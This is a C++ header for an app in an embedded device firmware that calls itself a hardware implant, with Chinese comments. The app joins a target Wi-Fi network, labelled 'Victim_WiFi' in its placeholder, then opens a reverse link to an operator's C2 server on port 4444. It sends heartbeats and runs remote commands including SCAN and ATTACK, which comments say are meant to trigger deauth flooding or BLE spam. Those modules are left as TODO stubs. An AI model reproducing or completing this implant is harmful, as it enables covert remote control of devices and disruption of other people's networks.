#ifndef APP_C2_BEACON_H
#define APP_C2_BEACON_H

#include "../src/NanoUI.h"
#include <WiFi.h>

class AppC2Beacon : public Application {
private:
    enum State { STATE_INIT, STATE_CONNECT_WIFI, STATE_CONNECT_C2, STATE_TERMINAL };
    State state = STATE_INIT;

    // 渗透配置区 (按需修改)
    const char* TARGET_SSID = "Your_Hotspot_Or_Victim_WiFi"; 
    const char* TARGET_PASS = "12345678";
    const char* C2_HOST = "123.45.67.89"; // 你的公网服务器 IP
    const int   C2_PORT = 4444;           // 服务器监听的端口

    WiFiClient c2_client;
    uint32_t last_heartbeat = 0;
    uint32_t anim_frame = 0;

    // 终端日志墙 (保存最近 4 行日志)
    String terminal_lines[4] = {"", "", "", ""};

    void push_log(String msg) {
        terminal_lines[0] = terminal_lines[1];
        terminal_lines[1] = terminal_lines[2];
        terminal_lines[2] = terminal_lines[3];
        terminal_lines[3] = msg;
    }

    // 核心：处理云端发来的指令
    void process_c2_command(String cmd) {
        cmd.trim();
        if (cmd.length() == 0) return;
        
        push_log("C2> " + cmd);
        
        // 这里可以对接你前面写好的攻击模块！
        if (cmd == "PING") {
            c2_client.println("[SYS] PONG - Device is alive.");
            push_log(">> TX: PONG");
        } 
        else if (cmd == "SCAN") {
            c2_client.println("[SYS] Scanning environment...");
            push_log(">> ACTION: SCANNING");
            // TODO: 调用你的 wifi_scan 逻辑，把结果 println 发给服务器
        }
        else if (cmd == "ATTACK") {
            c2_client.println("[SYS] Deploying payload...");
            push_log(">> ACTION: ATTACKING");
            // TODO: 启动你的 Deauth 洪泛或者 BLE Spam
        }
        else {
            c2_client.println("[ERR] Unknown command.");
        }
    }

public:
    const char* getAppName() override { return "C2 BEACON"; }
    AppMode getMode() override { return APP_MODE_EXCLUSIVE; }

    void runExclusive(Canvas* canvas, InputDriver* input) override {
        // 必须确保混杂模式彻底关闭，切回标准的网卡模式
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0); 
        wifi_off(); safe_delay(100);
        wifi_on(RTW_MODE_STA); safe_delay(100);

        bool running = true;
        state = STATE_CONNECT_WIFI;
        push_log("[*] INIT C2 ENGINE");

        while (running && is_display_active) {
            UIEvent e = input->poll();
            uint32_t now = hal_get_ticks();
            anim_frame++;

            if (e.type == EVT_BACK) {
                running = false;
                if (c2_client.connected()) c2_client.stop();
                WiFi.disconnect();
            }

            // ================== 状态机：远控链路保活 ==================
            if (state == STATE_CONNECT_WIFI) {
                if (WiFi.status() != WL_CONNECTED) {
                    push_log("[*] ASSOC: " + String(TARGET_SSID));
                    canvas->clear();
                    canvas->drawText(2, 20, terminal_lines[2].c_str());
                    canvas->drawText(2, 32, terminal_lines[3].c_str());
                    canvas->display();

                    WiFi.begin((char*)TARGET_SSID, (char*)TARGET_PASS);
                    
                    int timeout = 0;
                    while (WiFi.status() != WL_CONNECTED && timeout < 20) {
                        safe_delay(500);
                        timeout++;
                    }
                    
                    if (WiFi.status() == WL_CONNECTED) {
                        push_log("[+] WLAN CONNECTED!");
                        state = STATE_CONNECT_C2;
                    } else {
                        push_log("[-] WLAN FAILED. RETRY...");
                    }
                } else {
                    state = STATE_CONNECT_C2;
                }
            }
            else if (state == STATE_CONNECT_C2) {
                push_log("[*] DIALING C2 SERVER...");
                canvas->clear();
                canvas->drawText(2, 20, terminal_lines[2].c_str());
                canvas->drawText(2, 32, terminal_lines[3].c_str());
                canvas->display();

                if (c2_client.connect(C2_HOST, C2_PORT)) {
                    push_log("[+] C2 SHELL SECURED!");
                    c2_client.println("====================================");
                    c2_client.println(" CRABIT OS - HARDWARE IMPLANT V1.0");
                    c2_client.println(" STATUS: ONLINE");
                    c2_client.println("====================================");
                    state = STATE_TERMINAL;
                    last_heartbeat = now;
                } else {
                    push_log("[-] C2 DIAL FAILED. WAIT...");
                    safe_delay(3000); // 连不上公网就等3秒重试
                }
            }
            else if (state == STATE_TERMINAL) {
                // 1. 如果网断了或者服务器掉线，退回重连状态
                if (WiFi.status() != WL_CONNECTED) {
                    state = STATE_CONNECT_WIFI;
                }
                else if (!c2_client.connected()) {
                    push_log("[-] C2 LINK DROPPED.");
                    state = STATE_CONNECT_C2;
                }
                else {
                    // 2. 读取公网服务器下发的指令
                    if (c2_client.available()) {
                        String cmd = c2_client.readStringUntil('\n');
                        process_c2_command(cmd);
                    }

                    // 3. 心跳包保活 (每 15 秒向公网发一次)
                    if (now - last_heartbeat > 15000) {
                        c2_client.println("[SYS] HEARTBEAT");
                        push_log(">> TX: HEARTBEAT");
                        last_heartbeat = now;
                    }
                }
            }

            // ================== 赛博终端 UI 渲染 ==================
            canvas->clear();
            
            // 全黑底色，营造命令行氛围
            canvas->fillRect(0, 0, 128, 64, C_BLACK);
            
            // 顶栏状态
            canvas->fillRect(0, 0, 128, 11, C_WHITE);
            canvas->drawText(2, 2, "REVERSE C2 LINK", 1, true);

            // 右上角连接指示器动画
            if (state == STATE_TERMINAL) {
                bool blink = ((now / 250) % 2 == 0);
                if (blink) canvas->drawText(116, 2, "UP", 1, true);
            }

            // 绘制命令行滚动日志
            for (int i = 0; i < 4; i++) {
                canvas->drawText(2, 14 + (i * 12), terminal_lines[i].c_str(), 1, false);
            }

            // 底部的指令输入提示符闪烁
            if (state == STATE_TERMINAL) {
                bool cursor_blink = ((now / 400) % 2 == 0);
                canvas->drawText(2, 54, "root@crabit:~#", 1, false);
                if (cursor_blink) canvas->fillRect(88, 54, 5, 8, C_WHITE);
            }

            canvas->display();
            safe_delay(20);
        }

        // 退出时优雅断开连接
        if (c2_client.connected()) c2_client.stop();
        WiFi.disconnect();
        wifi_off(); // 退回无干扰状态
    }
};

#endif